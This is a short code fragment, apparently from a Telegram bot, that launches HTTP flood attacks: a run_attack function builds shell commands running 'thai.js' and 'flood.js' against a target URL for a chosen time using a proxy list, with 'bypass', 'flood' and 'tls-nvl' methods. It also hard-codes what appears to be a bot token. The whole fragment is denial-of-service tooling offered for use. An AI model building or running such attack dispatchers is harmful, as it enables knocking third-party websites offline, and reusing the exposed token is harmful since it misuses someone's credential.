...
TOKEN = '7693836903:AAFo0Sft0TXcdc91uK4Byy7NErgoFAEq3Zk'
...
async def run_attack(url, attack_time, update, method, context):
    ...
    commands = {
        'bypass': f"node {heap_size} thai.js {url} {attack_time} 8 2 live.txt bypass",     
        'flood': f"node {heap_size} flood.js {url} {attack_time} 11 3 live.txt ",            
        'tls-nvl': f"node {heap_size} flood.js {url} {attack_time} 5 2 live.txt"     
    }
